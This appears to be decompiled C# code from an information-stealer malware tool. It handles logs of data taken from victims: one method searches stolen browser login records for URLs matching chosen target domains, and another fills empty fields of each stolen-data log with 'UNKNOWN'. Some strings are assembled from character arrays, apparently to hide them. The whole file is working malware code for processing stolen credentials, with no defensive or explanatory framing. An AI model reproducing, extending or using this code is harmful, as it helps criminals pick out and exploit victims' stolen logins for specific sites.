using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;

// Token: 0x02000037 RID: 55
public static class UserExt
{
	// Token: 0x06000113 RID: 275 RVA: 0x00009984 File Offset: 0x00007B84
	public static bool DomainExists(this Entity_CollectedResults log, string domains)
	{
		if (string.IsNullOrWhiteSpace(domains))
		{
			return true;
		}
		string[] links = domains.Split(new string[]
		{
			new string(new char[]
			{
				'|'
			})
		}, StringSplitOptions.RemoveEmptyEntries);
		string[] links3 = links;
		if (links3 != null && links3.Length == 0)
		{
			return true;
		}
		try
		{
			Entity_StolenData id = log.StolenData;
			bool? flag;
			if (id == null)
			{
				flag = null;
			}
			else
			{
				List<Entity_Browser> id2 = id.StolenBrowsers;
				if (id2 == null)
				{
					flag = null;
				}
				else
				{
					IEnumerable<Entity_Browser> enumerable = from x in id2
					where x.LoginData != null
					select x;
					if (enumerable == null)
					{
						flag = null;
					}
					else
					{
						IEnumerable<Entity_LoginData> enumerable2 = enumerable.SelectMany((Entity_Browser x) => x.LoginData);
						flag = ((enumerable2 != null) ? new bool?(enumerable2.Any(delegate(Entity_LoginData x)
						{
							foreach (string value in links)
							{
								if (x.URL.Contains(value))
								{
									return true;
								}
							}
							return false;
						})) : null);
					}
				}
			}
			return flag ?? false;
		}
		catch
		{
		}
		return false;
	}

	// Token: 0x06000114 RID: 276 RVA: 0x00009AB4 File Offset: 0x00007CB4
	public static void PreCheck(this Entity_CollectedResults log)
	{
		try
		{
			foreach (PropertyInfo propertyInfo in log.GetType().GetProperties())
			{
				if (propertyInfo.PropertyType == typeof(string) && string.IsNullOrWhiteSpace(propertyInfo.GetValue(log, null) as string))
				{
					propertyInfo.SetValue(log, new string(new char[]
					{
						'U',
						'N',
						'K',
						'N',
						'O',
						'W',
						'N'
					}), null);
				}
			}
		}
		catch
		{
		}
	}
}
